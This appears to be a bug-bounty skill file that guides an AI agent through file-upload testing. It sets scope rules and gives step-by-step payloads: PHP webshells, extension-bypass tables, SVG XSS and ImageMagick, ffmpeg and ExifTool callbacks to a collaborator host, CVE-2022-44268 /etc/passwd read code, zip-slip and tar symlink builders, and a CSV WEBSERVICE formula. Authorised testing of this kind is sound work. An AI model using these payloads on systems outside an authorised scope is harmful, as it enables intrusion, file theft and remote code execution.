---
name: hunt-file-upload
description: "Hunt file upload bugs — RCE via webshell, XSS via SVG/HTML, SSRF via XXE in DOCX, path traversal via filename. Bypass tables (10 techniques): double extension (shell.php.jpg if server checks last ext only), magic bytes spoofing (PNG header on PHP), null byte (shell.php\0.jpg), case (PHP, .Php, .pHP), .htaccess upload to enable execution, SVG with <script>, HTML/SVG XSS, DOCX with embedded XXE, ZIP slip (../../../etc/passwd in archive), polyglot files. Detection: any /upload, /avatar, /profile-picture, /attachment, /import endpoint. Test: upload PHP/JSP/ASPX shells, request via direct URL, check response. Validate: actual code execution (whoami output) for RCE; reflected XSS in profile-photo URL. Use when testing file upload features, avatar/attachment endpoints, import/export functions, XML/DOCX/ZIP processors. Real paid examples."
---

# HUNT-FILE-UPLOAD — Upload, process, fetch

An upload is a finding only when something **later** uses the bytes: the web server executes them, a browser renders them on the target origin, a parser reads a file or a URL from inside them, or the extractor writes outside the destination. "File stored" is not a bug.

## Rails
- In-scope only. One file, one follow-up request.
- No webshell left behind, no `rm`, no memory-corruption crashers (crafted WebP/ImageMagick heap overflows). A crash is DoS.
- Marker first. A one-shot `id` or a unique string only after the marker proves the file is fetched or executed.
- Zip-slip and `.htaccess` / `web.config` writes are state-changing — one harmless marker file, then stop.
- Stop at draft. Never auto-submit.

## Decision tree

1. **Find the sink.** Multipart upload, avatar, attachment, import, theme, font, CSV, resume, invoice, "convert", video/image pipeline, support ticket.
2. **Note the stack** from headers and the URL the app returns (`Location`, JSON `url`, CDN host). PHP, JSP/ASP, Node static, S3/GCS, and "parser only" are different endings.
3. **Upload a harmless marker** (`MARK-<uniq>.txt` or a tiny PNG) and see if you can fetch that URL. Record content-type and whether the body is sniffed or forced to `Content-Disposition: attachment`.
4. **Branch on what you were allowed to store:**

   | Fetched body | Try | Proof |
   |---|---|---|
   | Script extension executed (PHP/JSP/ASPX) | one `<?php echo md5("UPUNIQ"); system("id"); ?>` or the stack's equivalent | md5 or `uid=` from **GET of the returned URL** |
   | HTML/SVG served same-origin, sniffed as active content | SVG/HTML below | script runs in a browser on that origin, or the response is `image/svg+xml` without attachment |
   | Image/doc pipeline (ImageMagick, Ghostscript, ffmpeg, LibreOffice, wkhtmltopdf, headless Chrome) | URL or file read **inside** the format | Collaborator hit or file bytes in the output |
   | ZIP/TAR/7z extracted | path inside the archive (`../` and `..\\`) | marker contents at the traversed path, fetched once |
   | Stored name left the upload directory | `filename="../mark-UNIQ.txt"` or `..\\mark-UNIQ.txt` | fetch the marker at that path once |
   | S3/CDN with `Content-Type` you set | HTML on a domain that is not the app origin | XSS only if that domain holds cookies or a privileged origin. Otherwise say "uploaded HTML on a sandbox domain" and do not claim ATO |
   | Download forced, never rendered, never parsed | stop | not a finding |

5. **Extension games** only if a normal `.php`/`.jsp`/`.aspx` was rejected and the stack can execute that language. Order: alternative extension, double extension, case, trailing dot/space, content-type lie, magic-byte prefix. Null byte `%00` only on very old PHP. Stop at the first file that executes.

6. **Temp-file race.** If the file is accepted and then disappears (AV/scanner deletes it seconds later), race the fetch against the delete — one burst of parallel GETs on the returned URL (`hunt-race-condition`). A single fetched marker is the proof, then stop.

## Bypasses (execution)

| Goal | Names to try |
|---|---|
| PHP | `.php`, `.phtml`, `.php5`, `.phar`, `.php8`, `.inc`, `.php.`, `.php%20`, `.pHp` |
| IIS / ASP | `.aspx`, `.ashx`, `.asmx`, `.cer`, `.config`, `.aspx;.jpg`, `.ashx;.png` (semicolon path-info: handler sees `.aspx`, filter sees `.jpg`) |
| Java | `.jsp`, `.jspx`, `.war` (only if the container auto-deploys — one probe) |
| Apache handler (nginx ignores `.htaccess`) | one `.htaccess` with `AddType application/x-httpd-php .mark` plus `shell.mark` that prints the marker |
| SSI | `.shtml` / `.stm` with `<!--#echo var="DOCUMENT_NAME" -->` (prove parse) then one `<!--#exec cmd="id"-->` only if exec is enabled |
| IIS handler | one `web.config` requestFiltering/handlers change, same marker |
| PHP-FPM user.ini | `.user.ini` `auto_prepend_file` only if you can already upload a second file you control |
| MIME trust | `Content-Type: image/jpeg` with a script body — only matters if the **fetcher** executes it |
| Magic sniff | prefix `GIF89a` before `<?php ... ?>` when the check is the first bytes and the engine still runs the rest |
| Polyglot | valid image **and** a script only if both a resizer and the PHP engine process the same object — prove execution, not the image header |

Filename command injection (`;id`, `$(id)`, backticks) when the name is passed to `exec`/`convert`/`ffmpeg`. OOB `UNIQUE.collab`. One shot. Never `; rm`.

## Content bugs

**SVG / HTML** (same origin, not downloaded as an attachment):
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://UNIQUE.collab/'+document.domain)">
  <script>document.title='UPUNIQ'</script>
</svg>
```
`alert` in your own session is stored XSS only if another user (or a victim browser you do not need — a second account opening the URL) would run it. If the CDN serves `Content-Disposition: attachment` or a sandboxed domain, say so and drop ATO claims.

**DOCX/XLSX/PPTX and SVG XXE** → `hunt-xxe`. Inject into `word/document.xml` or `[Content_Types].xml`. Proof is file bytes or one OOB fetch.

**Image / video URL fetch** (Collaborator, not a crash file):
```
# SVG / MVG processed by ImageMagick or a similar loader
<image xlink:href="http://UNIQUE.collab/img"/>
fill 'url(http://UNIQUE.collab/mvg)'
```
```
# ffmpeg / HLS
#EXTM3U
#EXTINF:1,
http://UNIQUE.collab/hls
```
Legacy ImageMagick delegates (`CVE-2016-3714` class) and Ghostscript `%!PS` file reads are in play only when a callback or file bytes return. Ghostscript builds that still honor the `%pipe%` device (CVE-2023-36664 class) are command execution, not just file read — same one-callback bar. **ExifTool < 12.24 parsing your upload** (any app that reads or strips EXIF; the GitLab unauth RCE CVE-2021-22205 class): a DjVu annotation chunk carrying a Perl escape such as `\c${system('curl http://UNIQUE.collab/')}` executes at parse time — proof is the callback. If policy.xml blocks delegates, record that and move on. Do not upload a memory-corruption PoC.

**PNG `profile` file read (CVE-2022-44268, ImageMagick before 7.1.0-50 and the matching 6.x).** A `tEXt` keyword `profile` whose value is an absolute path is embedded into the **processed** image as hex. The upload response that echoes your path is not the leak.

```python
from PIL import Image
from PIL.PngImagePlugin import PngInfo
img = Image.new("RGB", (8, 8))
info = PngInfo()
info.add_text("profile", "/etc/passwd")  # one path
img.save("/tmp/mark.png", pnginfo=info)
```

Download the image the pipeline returned, hex-decode the `Raw profile type` chunk, and stop when you see `root:x:0:0`. No second path.

**CSV / XLSX the app or another user opens.** One cell `=WEBSERVICE("https://UNIQUE.collab/csv")`. The finding is the callback from that client. A formula that only sits in storage is not impact.

**HTML → PDF / screenshot**
```html
<iframe src="file:///etc/passwd"></iframe>
<link rel="stylesheet" href="http://UNIQUE.collab/css">
```
Proof is `root:x:0:0:` in the PDF/image, or the CSS/HTTP hit from the converter's IP. JS in the PDF engine is RCE only with a callback.

**Archive slip.** Python's `zipfile` may normalize `..`; write the name explicitly and verify with `unzip -l`:
```python
import zipfile
z = zipfile.ZipFile('/tmp/slip.zip','w')
zi = zipfile.ZipInfo('../mark-UNIQ.txt')  # also try ..\\mark-UNIQ.txt on a Windows extractor, one archive
z.writestr(zi, b'mark-UNIQ')
z.close()
```
TAR symlink (do **not** pass `--dereference`, which stores the target bytes instead of the link):
```bash
ln -s /etc/passwd mark.txt
tar -cf slip.tar mark.txt
```
Proof: fetch `mark-UNIQ.txt` or see `root:x:0:0:` from the symlink extraction. One path. Do not aim at a cron directory or a shell path until a marker has already landed and the engagement allows a single `id` file you then remove.

## Validation
- **RCE:** GET the URL the app gave you; body contains `uid=` or the md5 hex of the literal `UPUNIQ`. A 200 from the upload API is not execution.
- **XSS:** the browser runs the script on the target origin from the file URL. `text/plain`, `Content-Disposition: attachment`, or `X-Content-Type-Options: nosniff` plus a non-HTML/SVG `Content-Type` = no XSS.
- **SSRF / XXE / image profile:** Collaborator hit from the server, or file contents inside the converted output. For CVE-2022-44268 the hex is in the **processed** image, not the path string you uploaded.
- **Traversal write:** the marker is readable at the escaped path. Then stop.
- **Not a finding:** stored blob you cannot fetch, AV "skipped", polyglot that only opens as an image.

## Chains
- Executed script → `hunt-rce` (one command). Same request, one report.
- DOCX/SVG parser → `hunt-xxe`.
- SVG/HTML on the app origin → `hunt-xss` (second account loads it once).
- Image URL fetch of `169.254.169.254` → `hunt-ssrf`. IMDSv2 401 is not keys.
- `phar` metadata on an image the server passes to `file_exists` → `hunt-deserialization`.

## Before you report — dedup gate

Fresh/changed surface first (see `dedup-novelty`, `changed-js-deepdive`), and hunt classes in yield
order (`/yield`). Before drafting ANY finding from this skill, run the dedup gate:

```bash
python3 engine/dedup.py check --program <program> --class <class> --url "<endpoint>" --title "<title>"
```

`NOVEL` -> proceed to `/validate`. `LIKELY_DUP` -> stop unless you can prove a concrete differentiator
(different endpoint/param/impact, or a bypass of the deployed fix -> report as a regression).
